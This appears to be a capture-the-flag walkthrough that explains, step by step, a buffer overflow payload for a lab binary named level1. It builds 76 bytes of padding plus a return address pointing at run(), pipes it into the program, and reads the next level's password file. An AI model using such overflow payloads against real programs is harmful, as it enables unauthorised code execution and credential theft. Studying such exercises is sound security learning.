Command:
python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/exploit

----------------------------------------
1. python -c
----------------------------------------

Runs Python code directly from the command line.

----------------------------------------
2. 'print "A"*76 + "\x44\x84\x04\x08"'
----------------------------------------

This creates the payload.

"A"*76
→ Generates 76 characters 'A'

This fills:
- buffer
- saved EBP
- reaches return address

----------------------------------------
3. "\x44\x84\x04\x08"
----------------------------------------

This is a memory address written in hexadecimal (byte form).

0x08048444 → address of run()

Written in little endian:
→ \x44\x84\x04\x08

This overwrites the return address.

----------------------------------------
4. Full payload structure
----------------------------------------

[ "A" * 76 ] + [ address of run() ]

----------------------------------------
5. > /tmp/exploit
----------------------------------------

Redirects the output into a file.

Creates a file containing the payload.

----------------------------------------
FINAL RESULT
----------------------------------------

The file /tmp/exploit contains:

- padding (A's)
- overwritten return address

When sent to the program:
→ buffer overflow happens
→ return address is replaced
→ execution jumps to run()

------------------------------------------
Run the vulnerable program with payload

cat /tmp/exploit - | ./level1
--------------------------------------------
Read the password (flag)

cat /home/user/level2/.pass